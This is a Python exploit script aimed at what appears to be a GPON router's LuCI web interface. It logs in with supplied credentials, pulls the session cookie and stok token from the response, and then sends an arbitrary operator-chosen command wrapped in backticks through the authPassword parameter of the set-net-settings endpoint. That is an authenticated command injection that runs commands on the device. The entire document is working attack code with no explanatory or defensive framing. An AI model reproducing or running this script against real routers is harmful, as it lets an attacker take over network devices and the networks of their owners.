import requests
import base64
import re

target = input("Enter Target IP : ")
username = input("Enter Target username : ")
passwd = input("Enter Target passwd : ")
cmd = input("Enter you want cmd : ")

encoded_username = base64.b64encode(username.encode('utf-8'))

encoded_passwd = base64.b64encode(passwd.encode('utf-8'))

burp0_url = "http://" + target + ":80/cgi-bin/luci"
burp0_cookies = {"sysauth": "", "isLogin": "false", "repeatTimes": "0", "uid": "kuEfA0Ffmd"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://" + target, "Connection": "close", "Referer": "http://" + target + "/cgi-bin/luci", "Upgrade-Insecure-Requests": "1"}
burp0_data = {"username-show": username, "username": encoded_username.decode('utf-8'), "password-show": passwd, "password": encoded_passwd.decode('utf-8')}
response = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

if 'Set-Cookie' in response.headers:
    set_cookie = response.headers['Set-Cookie']
    print(f'The Set-Cookie value is: {set_cookie}')
else:
    print('No Set-Cookie field in the response header')


pattern = r'(?<=\=)([^;]*)'
matches = re.findall(pattern, set_cookie)

sysauth = matches[0]
path = matches[1]
stok = matches[2]


burp0_url = "http://" + target + ":80" + path + ";stok=" + stok + "/admin/gpon/set-net-settings?authPassword=123`" + cmd + "`"
burp0_cookies = {"sysauth": sysauth, "isLogin": "true", "repeatTimes": "0", "uid": "kuEfA0Ffmd"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Referer": "http://" + target + "/cgi-bin/luci"}
requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)